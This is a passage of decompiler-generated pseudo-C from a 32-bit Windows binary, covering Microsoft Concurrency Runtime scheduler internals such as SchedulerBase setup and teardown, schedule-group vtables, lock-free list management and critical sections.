  unsigned int v30; // [esp+10h] [ebp-14h]
  int v31; // [esp+10h] [ebp-14h]
  int v32; // [esp+14h] [ebp-10h]
  unsigned int v33; // [esp+14h] [ebp-10h]
  int v34; // [esp+18h] [ebp-Ch]
  int v35; // [esp+18h] [ebp-Ch]
  int v36; // [esp+1Ch] [ebp-8h]
  int v37; // [esp+1Ch] [ebp-8h]
  unsigned int v38; // [esp+20h] [ebp-4h]
  unsigned int v39; // [esp+20h] [ebp-4h]

  v3 = 0;
  v30 = 0;
  if ( this[6] )
  {
    v4 = 0;
    v5 = 0;
    v32 = 0;
    v28 = 0;
    do
    {
      v38 = 0;
      v6 = v5 + this[18];
      if ( *(_DWORD *)(v6 + 4) )
      {
        v34 = 0;
        v7 = 0;
        v8 = 0;
        v36 = 0;
        do
        {
          v9 = v7 + *(_DWORD *)(v6 + 32);
          v10 = *(_DWORD *)(v9 + 20);
          *(_DWORD *)(v9 + 20) = 0;
          *(_DWORD *)(v9 + 24) = v10;
          v11 = this[25];
          if ( v11 )
          {
            v12 = *(_DWORD *)(v11 + 24);
            if ( v12 )
            {
              do
              {
                v13 = (_DWORD *)(v34 + *(_DWORD *)(v32 + *(_DWORD *)(v12 + 16) + 48));
                v13[8] = v13[7];
                v14 = v13[6];
                v13[7] = v14;
                *(_DWORD *)(v9 + 20) += v14;
                if ( v12 == this[25] )
                  break;
                v12 = *(_DWORD *)(v12 + 24);
              }
              while ( v12 );
              v5 = v28;
              v8 = v38;
            }
            v7 = v36;
          }
          ++v8;
          v34 += 52;
          v6 = v5 + this[18];
          v7 += 36;
          v38 = v8;
          v36 = v7;
        }
        while ( v8 < *(_DWORD *)(v6 + 4) );
        v3 = v30;
        v4 = v32;
      }
      ++v3;
      v5 += 40;
      v4 += 52;
      v30 = v3;
      v28 = v5;
      v32 = v4;
    }
    while ( v3 < this[6] );
    v15 = 0;
    v39 = 0;
    if ( this[6] )
    {
      v16 = 0;
      v17 = 0;
      v37 = 0;
      v27 = 0;
      do
      {
        v18 = 0;
        v19 = v17 + this[18];
        v29 = 0;
        if ( *(_DWORD *)(v19 + 4) )
        {
          v35 = 0;
          v20 = 0;
          v31 = 0;
          do
          {
            v21 = *(_DWORD *)(v19 + 32);
            v26 = *(_DWORD *)(v21 + v20 + 24);
            v22 = this[25];
            v33 = *(_DWORD *)(v21 + v20 + 20);
            if ( v22 )
            {
              v23 = *(_DWORD **)(v22 + 24);
              if ( v23 )
              {
                while ( 1 )
                {
                  if ( v23[33] == v23[32] )
                  {
                    v24 = (_DWORD *)(*(_DWORD *)(v37 + v23[4] + 48) + v35);
                    if ( v24[9] )
                    {
                      if ( v23 == a2 )
                      {
                        sub_456307((int)v23, (int)v24, v33 > v24[7]);
                      }
                      else
                      {
                        if ( v26 != v24[8] )
                        {
                          v25 = v33 == v24[7];
LABEL_28:
                          if ( v25 && v26 > v24[8] )
                            sub_456307((int)v23, (int)v24, 0);
                          goto LABEL_31;
                        }
                        v25 = v33 == v24[7];
                        if ( v33 <= v24[7] )
                          goto LABEL_28;
                        sub_456307((int)v23, (int)v24, 1);
                      }
                    }
                  }
LABEL_31:
                  if ( v23 != (_DWORD *)this[25] )
                  {
                    v23 = (_DWORD *)v23[6];
                    if ( v23 )
                      continue;
                  }
                  v17 = v27;
                  v18 = v29;
                  v20 = v31;
                  break;
                }
              }
            }
            ++v18;
            v35 += 52;
            v19 = v17 + this[18];
            v20 += 36;
            v29 = v18;
            v31 = v20;
          }
          while ( v18 < *(_DWORD *)(v19 + 4) );
          v15 = v39;
          v16 = v37;
        }
        ++v15;
        v17 += 40;
        v16 += 52;
        v39 = v15;
        v27 = v17;
        v37 = v16;
      }
      while ( v15 < this[6] );
    }
  }
}

//----- (0044EB07) --------------------------------------------------------
_DWORD *__thiscall sub_44EB07(_DWORD *this, int a2, char a3)
{
  _DWORD *result; // eax
  int v5; // edi
  int v6; // edi
  int v7; // [esp+10h] [ebp-4h]

  sub_44D2B4((int)this);
  memset((void *)(a2 + 64), 0, 0x30u);
  sub_44D77A(this, 0, a2, a2 + 64);
  *(double *)(a2 + 96) = (double)sub_44B917((_DWORD *)a2);
  *(_BYTE *)(a2 + 104) = a3;
  result = (_DWORD *)this[21];
  v7 = 1;
  *result = a2 + 64;
  v5 = this[25];
  if ( v5 )
  {
    v6 = *(_DWORD *)(v5 + 24);
    if ( v6 )
    {
      do
      {
        if ( v6 != a2 )
        {
          memset((void *)(v6 + 64), 0, 0x30u);
          sub_44D77A(this, v7, v6, v6 + 64);
          *(double *)(v6 + 96) = (double)sub_44B917((_DWORD *)v6);
          result = (_DWORD *)this[21];
          result[v7++] = v6 + 64;
        }
        if ( v6 == this[25] )
          break;
        result = *(_DWORD **)(v6 + 24);
        v6 = (int)result;
      }
      while ( result );
    }
  }
  return result;
}

//----- (0044EBCB) --------------------------------------------------------
int __thiscall sub_44EBCB(int this, _DWORD *a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  unsigned int v4; // edx
  unsigned int *v5; // ecx
  unsigned int v6; // eax
  int v7; // edx
  unsigned int v8; // esi
  unsigned int v10; // [esp+10h] [ebp-14h]
  int v11; // [esp+10h] [ebp-14h]
  unsigned int v12; // [esp+14h] [ebp-10h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_44A1E8((LPCRITICAL_SECTION)(this + 44));
  sub_44E24E((_DWORD *)(this + 96), (int)a2);
  v4 = 0;
  v10 = 0;
  if ( *(_DWORD *)(this + 24) )
  {
    v5 = (unsigned int *)(a2[4] + 4);
    do
    {
      if ( v5[6] )
      {
        v6 = 0;
        v12 = 0;
        if ( *v5 )
        {
          v7 = 0;
          do
          {
            v8 = v5[11];
            if ( *(_DWORD *)(v8 + v7) == 4 )
            {
              --**(_DWORD **)(v8 + v7 + 20);
              v6 = v12;
            }
            ++v6;
            v7 += 52;
            v12 = v6;
          }
          while ( v6 < *v5 );
          v4 = v10;
        }
      }
      ++v4;
      v5 += 13;
      v10 = v4;
    }
    while ( v4 < *(_DWORD *)(this + 24) );
    v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  }
  if ( a2[33] == a2[32] )
    --*(_DWORD *)(this + 16);
  v11 = *(_DWORD *)(this + 8) - 1;
  *(_DWORD *)(this + 8) = v11;
  if ( v11 == 1 )
    *(_DWORD *)(this + 40) = 0;
  sub_44A32E(v3);
  if ( v11 == 1 )
    SetEvent(*(HANDLE *)(this + 80));
  return (*(int (__thiscall **)(_DWORD *))(*a2 + 32))(a2);
}

//----- (0044EC9D) --------------------------------------------------------
_DWORD *__thiscall sub_44EC9D(int this, _DWORD *a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  _DWORD *v4; // edi

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_44A1E8((LPCRITICAL_SECTION)(this + 44));
  v4 = sub_4560FA(a2);
  if ( !v4 )
    v4 = sub_44D624((unsigned int *)this, a2, 0, 1);
  sub_44A32E(v3);
  return v4;
}

//----- (0044ECF1) --------------------------------------------------------
_DWORD *__thiscall sub_44ECF1(_DWORD *this, int a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  _DWORD *result; // eax

  result = a6;
  if ( *(_BYTE *)(a3 + 48) )
  {
    *(_BYTE *)(a3 + 48) = 0;
    --a6[5];
    --*(_DWORD *)(a2 + 40);
    if ( *(_BYTE *)(a3 + 49) )
    {
      --a6[6];
      --*(_DWORD *)(a2 + 44);
    }
    if ( *a5 == 6 )
    {
      result = a4;
      *a5 = 0;
      --a4[7];
      --this[8];
    }
    --a5[7];
  }
  else
  {
    *(_BYTE *)(a3 + 48) = 1;
    ++a6[5];
    ++*(_DWORD *)(a2 + 40);
    if ( *(_BYTE *)(a3 + 49) )
    {
      ++a6[6];
      ++*(_DWORD *)(a2 + 44);
    }
    result = a5;
    ++a5[7];
  }
  return result;
}

//----- (0044ED58) --------------------------------------------------------
int sub_44ED58()
{
  int result; // eax

  result = dword_500024;
  if ( !dword_500024 )
  {
    sub_44AE22(&dword_500068);
    result = dword_500024;
    if ( !dword_500024 )
    {
      sub_44E676();
      result = dword_500024;
    }
    dword_500068 = 0;
  }
  return result;
}
// 500024: using guessed type int dword_500024;
// 500068: using guessed type int dword_500068;

//----- (0044EDA1) --------------------------------------------------------
int __cdecl sub_44EDA1(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 20))(a1, 1);
  return result;
}

//----- (0044EDC4) --------------------------------------------------------
int __cdecl sub_44EDC4(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)(a1 + 4) + 20))(a1 + 4, 1);
  return result;
}

//----- (0044EDE9) --------------------------------------------------------
int __cdecl sub_44EDE9(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 16))(a1, 1);
  return result;
}

//----- (0044EE0C) --------------------------------------------------------
unsigned int *__thiscall sub_44EE0C(unsigned int *this, unsigned int a2)
{
  void *v3; // eax
  size_t v5; // [esp-8h] [ebp-Ch]

  this[1] = 0;
  *this = a2;
  v3 = (void *)unknown_libname_86((unsigned __int64)a2 >> 30 != 0 ? -1 : 4 * a2);
  v5 = 4 * *this;
  this[2] = (unsigned int)v3;
  memset(v3, 0, v5);
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0044EE4A) --------------------------------------------------------
PSLIST_HEADER __thiscall sub_44EE4A(PSLIST_HEADER ListHead, int a2, int a3, int a4)
{
  int v4; // edx
  int v6; // edx
  int v7; // edx
  struct _SINGLE_LIST_ENTRY *v8; // edi
  struct _SINGLE_LIST_ENTRY *v9; // eax
  struct _SINGLE_LIST_ENTRY **v10; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v12; // ecx
  int v13; // eax

  v4 = a3;
  *(_DWORD *)&ListHead[4].Depth = a2;
  *(_DWORD *)&ListHead[8].Depth = a4;
  ListHead[2].Next.Next = 0;
  *(_QWORD *)&ListHead[5].Depth = 0i64;
  ListHead[7].Next.Next = (struct _SINGLE_LIST_ENTRY *)512;
  *(_QWORD *)&ListHead[7].Depth = 1i64;
  ListHead[9].Next.Next = 0;
  if ( ((v4 - 1) & v4) != 0 )
  {
    v6 = (((a3 >> 1) | a3) >> 2) | (a3 >> 1) | a3;
    v7 = (((v6 >> 4) | v6) >> 8) | (v6 >> 4) | v6;
    v4 = ((v7 >> 16) | v7) + 1;
  }
  ListHead[5].Next.Next = (struct _SINGLE_LIST_ENTRY *)v4;
  v8 = (struct _SINGLE_LIST_ENTRY *)unknown_libname_86((unsigned __int64)(unsigned int)v4 >> 30 != 0 ? -1 : 4 * v4);
  memset(v8, 0, 4 * (int)ListHead[5].Next.Next);
  v9 = (struct _SINGLE_LIST_ENTRY *)operator new(0xCu);
  if ( v9 )
  {
    v9[2].Next = (struct _SINGLE_LIST_ENTRY *)-1;
    v9->Next = v8;
    v9[1].Next = 0;
  }
  else
  {
    v9 = 0;
  }
  ListHead[6].Next.Next = v9;
  v10 = (struct _SINGLE_LIST_ENTRY **)unknown_libname_86(
                                        (unsigned __int64)(unsigned int)ListHead[7].Next.Next >> 30 != 0
                                      ? -1
                                      : 4 * (int)ListHead[7].Next.Next);
  Next = ListHead[6].Next.Next;
  *(_DWORD *)&ListHead[6].Depth = v10;
  *v10 = Next;
  InitializeSListHead(ListHead);
  InitializeSListHead(ListHead + 1);
  v12 = (int)ListHead[5].Next.Next >> 1;
  if ( v12 )
  {
    v13 = *(_DWORD *)&ListHead[5].Depth;
    do
    {
      ++v13;
      v12 >>= 1;
    }
    while ( v12 );
    *(_DWORD *)&ListHead[5].Depth = v13;
  }
  return ListHead;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0044EF41) --------------------------------------------------------
_DWORD *__thiscall sub_44EF41(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  sub_459C71(this, a2, a3, a4);
  *this = &Concurrency::details::CacheLocalScheduleGroupSegment::`vftable';
  this[74] = 0;
  this[75] = this + 74;
  this[76] = 0;
  return this;
}
// 493B18: using guessed type void *Concurrency::details::CacheLocalScheduleGroupSegment::`vftable';

//----- (0044EF79) --------------------------------------------------------
_DWORD *__thiscall sub_44EF79(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  sub_459C71(this, a2, a3, a4);
  *this = &Concurrency::details::FairScheduleGroupSegment::`vftable';
  this[74] = 0;
  this[75] = this + 74;
  this[76] = 0;
  return this;
}
// 493B58: using guessed type void *Concurrency::details::FairScheduleGroupSegment::`vftable';

//----- (0044EFB1) --------------------------------------------------------
void __thiscall sub_44EFB1(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
}

//----- (0044EFC9) --------------------------------------------------------
_DWORD *__thiscall sub_44EFC9(_DWORD *this, int a2)
{
  void *v3; // eax
  unsigned int v4; // ecx

  *this = a2;
  v3 = (void *)unknown_libname_86((unsigned __int64)((unsigned int)(a2 + 31) >> 5) >> 30 != 0 ? -1 : 4 * ((unsigned int)(a2 + 31) >> 5));
  v4 = *this + 31;
  this[1] = v3;
  memset(v3, 0, 4 * (v4 >> 5));
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0044F00F) --------------------------------------------------------
HANDLE *__thiscall sub_44F00F(HANDLE *this, const void **a2)
{
  unsigned int v3; // esi
  int v4; // eax
  void *v5; // eax
  void *v6; // eax
  int LastError; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-20h] BYREF
  int v10; // [esp+2Ch] [ebp-4h]

  pExceptionObject[4] = this;
  *this = &Concurrency::details::SchedulerBase::`vftable';
  v10 = 0;
  sub_45471B(this + 1, a2);
  this[12] = 0;
  this[13] = 0;
  this[14] = 0;
  this[15] = 0;
  this[16] = 0;
  this[17] = 0;
  this[18] = 0;
  this[19] = 0;
  this[20] = 0;
  this[21] = 0;
  this[22] = 0;
  sub_44EE4A((PSLIST_HEADER)this + 12, 0, 256, 64);
  this[45] = 0;
  this[46] = 0;
  sub_449EED(this + 47);
  sub_44EE4A((PSLIST_HEADER)this + 25, 0, 256, 0x7FFFFFFF);
  sub_449ED8((LPCRITICAL_SECTION)(this + 70));
  this[76] = 0;
  sub_449EED(this + 77);
  this[79] = 0;
  this[80] = this + 79;
  this[81] = 0;
  this[82] = (HANDLE)-1;
  this[83] = (HANDLE)-1;
  this[84] = 0;
  this[85] = 0;
  this[86] = 0;
  sub_44EE0C((unsigned int *)this + 87, 0x1001u);
  sub_44EE0C((unsigned int *)this + 90, 0x1001u);
  this[93] = (HANDLE)-1;
  this[94] = 0;
  this[96] = 0;
  this[97] = 0;
  this[98] = HANDLE_FLAG_INHERIT;
  this[99] = 0;
  this[100] = 0;
  LOBYTE(v10) = 10;
  this[101] = 0;
  this[102] = 0;
  this[104] = 0;
  this[105] = 0;
  this[106] = 0;
  this[108] = 0;
  this[110] = 0;
  this[111] = 0;
  this[112] = 0;
  this[113] = 0;
  this[114] = 0;
  this[116] = 0;
  this[117] = 0;
  this[121] = 0;
  InitializeSListHead((PSLIST_HEADER)this + 61);
  InitializeSListHead((PSLIST_HEADER)this + 62);
  InitializeSListHead((PSLIST_HEADER)this + 63);
  InitializeSListHead((PSLIST_HEADER)this + 64);
  this[33] = this;
  this[2] = (HANDLE)sub_4547B8(a2, 0);
  *((_WORD *)this + 8) = sub_4547B8(a2, 4u);
  this[3] = (HANDLE)sub_4547B8(a2, 7u);
  v3 = sub_4547B8(a2, 1u);
  if ( 4 * sub_44CE93() <= v3 )
    v4 = sub_4547B8(a2, 1u);
  else
    v4 = 4 * sub_44CE93();
  this[115] = (HANDLE)v4;
  this[6] = (HANDLE)sub_44AA78();
  v5 = (void *)sub_44A69C(0);
  this[118] = v5;
  if ( !RegisterWaitForSingleObject(this + 119, v5, (WAITORTIMERCALLBACK)Callback, this, 0xFFFFFFFF, 0) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_14;
    goto LABEL_13;
  }
  if ( sub_44CE8E() < 3 )
  {
    v6 = (void *)sub_44A707(this + 120, 0, (WAITORTIMERCALLBACK)sub_45254E, this, 0x7FFFFFFFu, 0x7FFFFFFFu, 0);
  }
  else
  {
    v6 = (void *)sub_44AD0F(0x7FFFFFFFu, (int)sub_45253F, (int)this, 1);
    this[120] = v6;
  }
  if ( !v6 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_14;
LABEL_13:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_14:
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return this;
}
// 44CE8E: using guessed type int sub_44CE8E(void);
// 493AB4: using guessed type void *Concurrency::details::SchedulerBase::`vftable';

//----- (0044F2E9) --------------------------------------------------------
char *__thiscall sub_44F2E9(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::improper_scheduler_attach::`vftable';
  return this;
}
// 493A3C: using guessed type void *Concurrency::improper_scheduler_attach::`vftable';

//----- (0044F304) --------------------------------------------------------
char *__thiscall sub_44F304(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::improper_scheduler_reference::`vftable';
  return this;
}
// 493A48: using guessed type void *Concurrency::improper_scheduler_reference::`vftable';

//----- (0044F332) --------------------------------------------------------
void __thiscall sub_44F332(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 1;
    v2 = v2->Next;
    sub_44775B(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 1;
    v4 = v4->Next;
    sub_44775B(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 1;
    Next = Next->Next;
    sub_44775B(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_44775B(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j__free(v8->Next);
      sub_44775B(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j__free(*(void **)&ListHead[6].Depth);
}

//----- (0044F3D8) --------------------------------------------------------
void __thiscall sub_44F3D8(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  int v3; // ecx
  PSLIST_ENTRY v4; // esi
  int v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  int v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = (int)&v2[-13];
    v2 = v2->Next;
    sub_44EDE9(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = (int)&v4[-13];
    v4 = v4->Next;
    sub_44EDE9(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = (int)&Next[-13];
    Next = Next->Next;
    sub_44EDE9(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_44EDE9((int)v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j__free(v8->Next);
      sub_44775B(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j__free(*(void **)&ListHead[6].Depth);
}

//----- (0044F472) --------------------------------------------------------
void __thiscall sub_44F472(void **this)
{
  j_j__free(this[3]);
  j_j__free(this[1]);
}

//----- (0044F493) --------------------------------------------------------
void __thiscall sub_44F493(void **this)
{
  j_j__free(this[2]);
  j_j__free(this[1]);
}

//----- (0044F4AA) --------------------------------------------------------
void __thiscall sub_44F4AA(_DWORD *this)
{
  *this = &Concurrency::ScheduleGroup::`vftable';
}
// 493A54: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (0044F4B8) --------------------------------------------------------
void __thiscall sub_44F4B8(char *this)
{
  *(_DWORD *)this = &Concurrency::details::SchedulerBase::`vftable';
  sub_44FDBA((int)this);
  sub_4528B2((int *)this + 90);
  j_j__free(*((void **)this + 92));
  sub_4528B2((int *)this + 87);
  j_j__free(*((void **)this + 89));
  sub_449F62((LPCRITICAL_SECTION)(this + 280));
  sub_44F332((PSLIST_HEADER)this + 25);
  sub_44F3D8((PSLIST_HEADER)this + 12);
  j_j__free(*((void **)this + 22));
  sub_44F493((void **)this + 18);
  sub_44F493((void **)this + 15);
  sub_44F493((void **)this + 12);
  sub_454793((void **)this + 1);
  *(_DWORD *)this = &Concurrency::Scheduler::`vftable';
}
// 493A6C: using guessed type void *Concurrency::Scheduler::`vftable';
// 493AB4: using guessed type void *Concurrency::details::SchedulerBase::`vftable';

//----- (0044F571) --------------------------------------------------------
int __thiscall sub_44F571(_DWORD **this)
{
  return sub_44AE53(*this);
}

//----- (0044F5A7) --------------------------------------------------------
int __thiscall sub_44F5A7(_DWORD *this, int a2)
{
  int v3; // eax
  int v5; // ecx
  int v6; // esi
  int v7; // eax
  _DWORD *v8; // esi
  int v9; // eax

  v3 = a2 >> this[11];
  if ( v3 >= this[15] )
    return 0;
  v5 = this[14];
  v6 = this[13];
  if ( v3 < v5 )
  {
    v8 = *(_DWORD **)(v6 + 4 * v3);
  }
  else
  {
    v7 = v3 - v5;
    v8 = *(_DWORD **)(v6 + 4 * v5 - 4);
    if ( v7 >= 0 )
    {
      v9 = v7 + 1;
      do
      {
        v8 = (_DWORD *)v8[1];
        --v9;
      }
      while ( v9 );
    }
  }
  return *(_DWORD *)(*v8 + 4 * (a2 & (this[10] - 1)));
}

//----- (0044F5EF) --------------------------------------------------------
char *__thiscall sub_44F5EF(char *this, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(this, 0x10u, *((_DWORD *)this - 1), (void (__thiscall *)(void *))sub_44F472);
    if ( (a2 & 1) != 0 )
      sub_447DEF(this - 4);
    return this - 4;
  }
  else
  {
    sub_44F472((void **)this);
    if ( (a2 & 1) != 0 )
      sub_44775B(this);
    return this;
  }
}

//----- (0044F674) --------------------------------------------------------
_DWORD *__thiscall sub_44F674(_DWORD *Block, char a2)
{
  *Block = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493A54: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (0044F697) --------------------------------------------------------
void *__thiscall sub_44F697(void *Block, char a2)
{
  sub_459F24((signed __int32)Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0044F6BC) --------------------------------------------------------
_DWORD *__thiscall sub_44F6BC(_DWORD *Block, char a2)
{
  *Block = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493A54: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (0044F702) --------------------------------------------------------
_DWORD *__thiscall sub_44F702(_DWORD *Block, char a2)
{
  *Block = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493A54: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (0044F725) --------------------------------------------------------
_DWORD *__thiscall sub_44F725(_DWORD *Block, char a2)
{
  *Block = &Concurrency::Scheduler::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493A6C: using guessed type void *Concurrency::Scheduler::`vftable';

//----- (0044F748) --------------------------------------------------------
char *__thiscall sub_44F748(char *Block, char a2)
{
  sub_44F4B8(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0044F76D) --------------------------------------------------------
char *__thiscall sub_44F76D(char *Block, char a2)
{
  `eh vector destructor iterator'(Block + 4, 8u, 0x60u, (void (__thiscall *)(void *))sub_45814B);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0044F7F0) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_44F7F0(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_86((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_44AE9C;
        do
          sub_449592((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 24) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 44F7F0: using guessed type char var_24[8];

//----- (0044F94C) --------------------------------------------------------
signed __int32 __thiscall sub_44F94C(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v3; // eax

  v3 = (volatile signed __int32 *)operator new(8u);
  if ( v3 )
    *((_DWORD *)v3 + 1) = a2;
  else
    v3 = 0;
  return sub_451803(this + 45, v3);
}

//----- (0044F97D) --------------------------------------------------------
int __thiscall sub_44F97D(int *this, int a2)
{
  int result; // eax

  if ( *this )
  {
    *(_DWORD *)(a2 + 4) = *(_DWORD *)(*this + 4);
    *(_DWORD *)(a2 + 8) = *this;
    *(_DWORD *)(*(_DWORD *)(*this + 4) + 8) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = a2;
  }
  else
  {
    *this = a2;
    *(_DWORD *)(a2 + 8) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = *this;
  }
  return result;
}

//----- (0044F9B1) --------------------------------------------------------
_DWORD *__thiscall sub_44F9B1(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = *(_DWORD **)this;
  if ( *(_DWORD *)this )
  {
    *a2 = *result;
    a2[1] = *(_DWORD *)this;
    *(_DWORD *)(**(_DWORD **)this + 4) = a2;
    result = *(_DWORD **)this;
    **(_DWORD **)this = a2;
  }
  else
  {
    *a2 = a2;
    a2[1] = a2;
  }
  *(_DWORD *)this = a2;
  return result;
}

//----- (0044F9DE) --------------------------------------------------------
void __thiscall sub_44F9DE(volatile signed __int32 *this, _DWORD *a2)
{
  sub_44A220(this + 1);
  sub_44F9B1((void *)this, a2);
  sub_44A33A(this + 1);
}

//----- (0044FA12) --------------------------------------------------------
int __thiscall sub_44FA12(int this, int a2, unsigned int a3)
{
  int result; // eax
  unsigned int i; // ebx
  int v6; // eax
  int v7; // esi
  char pExceptionObject[12]; // [esp+Ch] [ebp-10h] BYREF
